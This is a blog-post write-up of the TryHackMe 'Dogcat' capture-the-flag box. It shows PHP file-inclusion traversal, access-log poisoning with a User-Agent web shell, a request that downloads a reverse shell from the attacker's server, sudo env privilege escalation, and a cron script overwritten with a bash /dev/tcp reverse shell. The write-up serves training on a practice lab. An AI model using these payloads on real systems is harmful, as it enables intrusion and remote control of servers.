---
layout: post
title: Dogcat | Writeup
categories: CTF
author: ThelastVvV
date: '2020-07-10 05:00:53 +0000'
tags:
  - CTF
  - CyberSecurity
  - TryHackMe
published: true
---
- [Dogcat](#dogcat)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Reverse shell](#reverse-shell)
- [Privilege Escalation:](#privilege-escalation)
- [4th Flag](#4th-flag)

<!-- toc -->

### Dogcat
Hallå gubbar , this my first ctf write-up i will try my best to make it easy for you so this box is webapp with lfi vulnerability and more the goal is to get 4 flags for more info check it out THM - DogCat

1 - Enumeration
2 - Exploitation
3- Reverse shell
4 - Privilege Escalation
5 - Flag 4



### Enumeration

Nmap scan & Results:
```sh
nmap -sV -p- -vv BoxIP
```

`22/tcp open ssh`
`80/tcp open http`

`Port 80` is open so we got web-server check the web page at 
```sh
http://box-ip
```
![alt text](https://thelastvvv.github.io/images/posts/3/main.png "THM")
so let check lfi playloads
```sh
http://box-ip/?view=../../../../../../etc/passwd
```
We get the following message

Sorry,only dogs or cats are allowed

So we need to use dog /cat keyword
```sh
http://box-ip/?view=dog../../../../../../etc/passwd
```

`Warning : include(dog../../../../../../etc/passwd.php):failed to open stream....`

so we can read /etc/passwd now we need to bypass it by stooping including php extension to passwd

in this case we will need a meta-wrapper that allows the application of filters to stream at time of the opening. 


More info here
[https://www.php.net/manual/en/wrappers.php.php](https://www.php.net/manual/en/wrappers.php.php)
[https://www.w3schools.com/php/php_filter.asp](https://www.w3schools.com/php/php_filter.asp)

```sh
http://box-ip/?view=php://filter/convert.base64-encode/resource=index
```

decoded using CyberChef

```php
<?php
function containsStr($str, $substr) {
return strpos($str, $substr) !== false;
}
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
if(isset($_GET['view'])) {
if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
echo 'Here you go!';
include $_GET['view'] . $ext;
} else {
echo 'Sorry, only dogs or cats are allowed.';
}
}
?>


echo 'Here you go!';
include $_GET['view'] . $ext;
} else {
```
we have an other parameter `ext` that we can use it ,let try it 
```sh
http://box-ip//?view=php://filter/resource=dog../../../../../../etc/passwd&ext=
```
now we need to do some lfi to rce trick to get in using log poisonning our box runs on Apache so log dir should be here
```sh
var/log/apache2/access.log
```
```sh
http://box-ip/?view=php://filter/resource=dog../../../../../../var/log/apache2/access.log&ext=
```
we can see some user-agent request registered in the logs ;)


### Exploitation

BURP TIMEEEEEE!!!! let intercept and inject our payload via user-agent data:D
Request:
```sh
GET /?view=php://filter/resource=dog../../../../../../var/log/apache2/access.log&ext= HTTP/1.1
Host: box-ip
User-Agent: <?php system($_GET['cmd']);?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
Cache-Control: max-age=0
```
Reponse:
```sh
HTTP/1.1 200 OK
Date: Thu, 09 Jul 2020 18:54:37 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.3
Vary: Accept-Encoding
Content-Length: 6769
Connection: close
Content-Type: text/html; charset=UTF-8
```


*  First FLAG
```SH
http://box-ip/?view=php://filter/resource=dog../../../../../../var/log/apache2/access.log&ext=&cmd=ls
```
```sh
cats
dog.php
dogs
flag.php
index.php
shell.php
style.css
```
```sh
http://box-ip//?view=php://filter/convert.base64-encode/resource=dog../../flag
```

decoded using 
[https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)


### Reverse shell

What we need ?

1. Download Reverse shell 
2. Launch http server
3. Pop up the shell


1. Download Reverse shell 
get any shell my fav for ctf "pentestmonkey"
[Reverse shell php](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
)

2. launch http server
```sh
python -m SimpleHTTPServer 1111
```

MAKE SURE TO EDIT THE SHELL AND REMEMBER THE LOCATION
`1111 PORT` U CAN CHANGE IT

I rename  the shell to Monkey and the location of the shell  is on the desktop.
```sh
http://Your-ip:1111/Desktop/Monkey.php
```
3. Pop up shell

Burp again !
```SH
Request:

GET /?view=php://filter/resource=dog../../../../../../var/log/apache2/access.log&ext= HTTP/1.1
Host: box-ip
User-Agent: <?php file_put_contents('shell.php', file_get_contents('http://Your-ip:1111/Desktop/Monkey.php'))?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
```
Reponse:
```sh
HTTP/1.1 200 OK
Date: Thu, 09 Jul 2020 19:22:45 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.3
Vary: Accept-Encoding
Content-Length: 16687
Connection: close
Content-Type: text/html; charset=UTF-8
```

http server confirmation:
```sh
Your-ip - - [09/Jul/2020 15:26:09] "GET /Desktop/Monkey.php HTTP/1.0" 200 -
```

Now we start listening to port (depend on you shell settings)
```sh
nc -lvnp 1234
```
![alt text](https://thelastvvv.github.io/images/posts/3/t1.png "THM")

* 2nd flag:

![alt text](https://thelastvvv.github.io/images/posts/3/t2.png "THM")

### Privilege Escalation:

* 3th Flag 
So now we need to be root we will use this command
```sh
sudo env /bin/bash
```
More details here :

[https://gtfobins.github.io/gtfobins/env/
](https://gtfobins.github.io/gtfobins/env/
)

![alt text](https://thelastvvv.github.io/images/posts/3/t3.png "THM")



### 4th Flag 
if we search in the backups dir we will find backup.sh that runs every-time,so now we need to edit this backupfile to reverse shell and bypass the docker-container using this command 
```sh
echo "#!/bin/bash" > backup.sh;echo "bash -i >& /dev/tcp/ip/Your-IP/port 0>&1" >> backup.sh
```

![alt text](https://thelastvvv.github.io/images/posts/3/ttt2.png "THM")



Now we start listening to port 
```sh
nc -lvnp 9999
```
![alt text](https://thelastvvv.github.io/images/posts/3/ttt4.png "THM")

voila we got all our 4 flags btw flags looks like this `THM{xx_xx_xx}` :P

See you next time .....


